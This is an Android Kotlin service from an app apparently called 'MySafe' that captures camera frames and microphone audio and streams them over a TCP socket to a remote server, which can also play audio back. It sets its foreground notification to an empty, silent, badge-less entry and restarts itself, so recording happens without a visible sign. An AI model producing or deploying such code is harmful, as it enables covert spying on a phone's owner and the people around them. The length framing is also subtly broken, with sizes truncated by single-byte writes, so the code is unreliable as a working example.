package com.mysafe.mysafe

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.graphics.RectF
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.*
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.OutputStream
import java.net.Socket
import java.nio.ByteBuffer

class CameraStreamService : Service() {
    companion object {
        private const val TAG = "MySafe-Cam"
        private const val CHANNEL_ID = "MySafeCamChannel"
        
        const val ACTION_START_STREAM = "com.mysafe.mysafe.START_STREAM"
        const val ACTION_STOP_STREAM = "com.mysafe.mysafe.STOP_STREAM"
        const val ACTION_TOGGLE_MIC = "com.mysafe.mysafe.TOGGLE_MIC"
        const val ACTION_TOGGLE_SPEAK = "com.mysafe.mysafe.TOGGLE_SPEAK"
        
        private var cameraDevice: CameraDevice? = null
        private var imageReader: ImageReader? = null
        private var audioRecord: AudioRecord? = null
        private var audioTrack: AudioTrack? = null
        private var isStreaming = false
        private var isMicEnabled = false
        private var isSpeakEnabled = false
        private var serverUrl: String = ""
        private var cameraFacing: Int = CameraCharacteristics.LENS_FACING_BACK
        private var previewSize: Size? = null
        private var cameraRotation: Int = 0
        
        var surface: Surface? = null
        var statusCallback: ((String) -> Unit)? = null
    }

    private lateinit var cameraManager: CameraManager
    private var socket: Socket? = null
    private var outputStream: OutputStream? = null
    private var videoJob: Job? = null
    private var audioSendJob: Job? = null
    private var audioRecvJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        Log.d(TAG, "🎥 Service Streaming démarré")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_STREAM -> {
                serverUrl = intent.getStringExtra("server_url") ?: ""
                cameraFacing = intent.getIntExtra("camera_facing", CameraCharacteristics.LENS_FACING_BACK)
                startStreaming()
            }
            ACTION_STOP_STREAM -> stopAll()
            ACTION_TOGGLE_MIC -> toggleMic()
            ACTION_TOGGLE_SPEAK -> toggleSpeak()
        }
        return START_STICKY
    }

    private fun startStreaming() {
        if (isStreaming) return
        
        statusCallback?.invoke("⏳ Connexion à $serverUrl...")
        
        if (!connectToServer()) {
            statusCallback?.invoke("❌ Connexion échouée")
            return
        }
        
        if (!openCamera()) {
            statusCallback?.invoke("❌ Caméra inaccessible")
            return
        }
        
        if (isMicEnabled) startAudioSend()
        if (isSpeakEnabled) startAudioReceive()
        
        isStreaming = true
        statusCallback?.invoke("✅ STREAMING ACTIF — ${previewSize?.width}x${previewSize?.height}")
    }

    private fun connectToServer(): Boolean {
        return try {
            // Extrait hôte et port de l'URL
            val cleanUrl = serverUrl.replace("http://", "").replace("https://", "")
            val parts = cleanUrl.split(":")
            val host = parts[0]
            val port = if (parts.size > 1) parts[1].toIntOrNull() ?: 8080 else 8080
            
            socket = Socket(host, port)
            outputStream = socket?.getOutputStream()
            Log.d(TAG, "✅ Connecté à $host:$port")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur connexion: ${e.message}")
            false
        }
    }

    private fun openCamera(): Boolean {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
        ) return false

        val cameraId = findCameraId(cameraFacing) ?: return false
        setupCameraSizes(cameraId)
        
        try {
            cameraManager.openCamera(cameraId, cameraStateCallback, null)
            return true
        } catch (e: CameraAccessException) {
            Log.e(TAG, "❌ Erreur caméra: ${e.message}")
            return false
        }
    }

    private fun findCameraId(facing: Int): String? {
        for (id in cameraManager.cameraIdList) {
            val chars = cameraManager.getCameraCharacteristics(id)
            if (chars.get(CameraCharacteristics.LENS_FACING) == facing) return id
        }
        return null
    }

    private fun setupCameraSizes(cameraId: String) {
        val chars = cameraManager.getCameraCharacteristics(cameraId)
        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: return
        
        // Choix du meilleur ratio 4:3 ou 16:9
        previewSize = sizes.firstOrNull { 
            val ratio = it.width.toFloat() / it.height.toFloat()
            Math.abs(ratio - 4f/3f) < 0.1 || Math.abs(ratio - 16f/9f) < 0.1
        } ?: sizes[0]
        
        // Calcul rotation pour avoir le bon sens
        val displayRotation = getSystemService(WindowManager::class.java).defaultDisplay.rotation
        val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
        cameraRotation = when (displayRotation) {
            Surface.ROTATION_0 -> sensorOrientation
            Surface.ROTATION_90 -> (sensorOrientation + 270) % 360
            Surface.ROTATION_180 -> (sensorOrientation + 180) % 360
            Surface.ROTATION_270 -> (sensorOrientation + 90) % 360
            else -> sensorOrientation
        }
        
        Log.d(TAG, "📐 Résolution: ${previewSize?.width}x${previewSize?.height}, Rotation: $cameraRotation°")
    }

    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(cam: CameraDevice) {
            cameraDevice = cam
            createCaptureSession()
        }
        override fun onDisconnected(cam: CameraDevice) { cam.close() }
        override fun onError(cam: CameraDevice, error: Int) { cam.close() }
    }

    private fun createCaptureSession() {
        val size = previewSize ?: return
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        
        val surfaceList = mutableListOf<Surface>()
        surface?.let { surfaceList.add(it) }
        surfaceList.add(imageReader!!.surface)
        
        try {
            val requestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
            requestBuilder?.addTarget(imageReader!!.surface)
            surface?.let { requestBuilder?.addTarget(it) }
            
            cameraDevice?.createCaptureSession(surfaceList, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    session.setRepeatingRequest(requestBuilder?.build()!!, null, null)
                    startVideoTransmission()
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur session: ${e.message}")
        }
    }

    private fun startVideoTransmission() {
        imageReader?.setOnImageAvailableListener({ reader ->
            try {
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                
                if (isStreaming && outputStream != null) {
                    scope.launch {
                        try {
                            outputStream?.write(bytes.size shr 0)
                            outputStream?.write(bytes.size shr 8)
                            outputStream?.write(bytes)
                        } catch (e: Exception) {}
                    }
                }
            } catch (e: Exception) {}
        }, null)
    }

    private fun startAudioSend() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) return
        
        val sampleRate = 44100
        val channelConfig = AudioFormat.CHANNEL_IN_MONO
        val format = AudioFormat.ENCODING_PCM_16BIT
        val minBuf = AudioRecord.getMinBufferSize(sampleRate, channelConfig, format)
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            sampleRate, channelConfig, format, minBuf * 4
        )
        audioRecord?.startRecording()
        
        audioSendJob = scope.launch {
            val buffer = ByteArray(minBuf)
            while (isActive && isMicEnabled && isStreaming) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0 && outputStream != null) {
                    try {
                        outputStream?.write(1) // 1 = paquet audio
                        outputStream?.write(read shr 0)
                        outputStream?.write(read shr 8)
                        outputStream?.write(buffer, 0, read)
                    } catch (e: Exception) {}
                }
            }
        }
    }

    private fun startAudioReceive() {
        val sampleRate = 44100
        val channelConfig = AudioFormat.CHANNEL_OUT_MONO
        val format = AudioFormat.ENCODING_PCM_16BIT
        val minBuf = AudioTrack.getMinBufferSize(sampleRate, channelConfig, format)
        
        audioTrack = AudioTrack.Builder()
            .setAudioAttributes(AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_MEDIA)
                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                .build())
            .setAudioFormat(AudioFormat.Builder()
                .setSampleRate(sampleRate)
                .setChannelMask(channelConfig)
                .setEncoding(format)
                .build())
            .setBufferSizeInBytes(minBuf * 4)
            .setTransferMode(AudioTrack.MODE_STREAM)
            .build()
        
        audioTrack?.play()
        
        audioRecvJob = scope.launch {
            val buffer = ByteArray(minBuf)
            while (isActive && isSpeakEnabled && isStreaming && socket?.isConnected == true) {
                try {
                    val input = socket?.getInputStream() ?: break
                    val type = input.read()
                    if (type == 2) { // 2 = paquet audio entrant
                        val sizeLo = input.read()
                        val sizeHi = input.read()
                        val size = sizeLo or (sizeHi shl 8)
                        if (size > 0 && size <= buffer.size) {
                            input.read(buffer, 0, size)
                            audioTrack?.write(buffer, 0, size)
                        }
                    }
                } catch (e: Exception) { break }
            }
        }
    }

    private fun toggleMic() {
        isMicEnabled = !isMicEnabled
        if (isMicEnabled && isStreaming) startAudioSend()
        else { audioSendJob?.cancel(); audioRecord?.stop() }
        statusCallback?.invoke("🎤 Micro: ${if (isMicEnabled) "ON" else "OFF"}")
    }

    private fun toggleSpeak() {
        isSpeakEnabled = !isSpeakEnabled
        if (isSpeakEnabled && isStreaming) startAudioReceive()
        else { audioRecvJob?.cancel(); audioTrack?.stop() }
        statusCallback?.invoke("🔊 Écoute: ${if (isSpeakEnabled) "ON" else "OFF"}")
    }

    private fun stopAll() {
        isStreaming = false
        isMicEnabled = false
        isSpeakEnabled = false
        
        videoJob?.cancel()
        audioSendJob?.cancel()
        audioRecvJob?.cancel()
        
        imageReader?.setOnImageAvailableListener(null, null)
        imageReader?.close()
        cameraDevice?.close()
        audioRecord?.apply { stop(); release() }
        audioTrack?.apply { stop(); release() }
        
        try { socket?.close() } catch (e: Exception) {}
        
        statusCallback?.invoke("⏸️ Streaming arrêté")
        stopSelf()
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "CameraStream", NotificationManager.IMPORTANCE_LOW
            ).apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { super.onDestroy(); stopAll(); scope.cancel() }
}
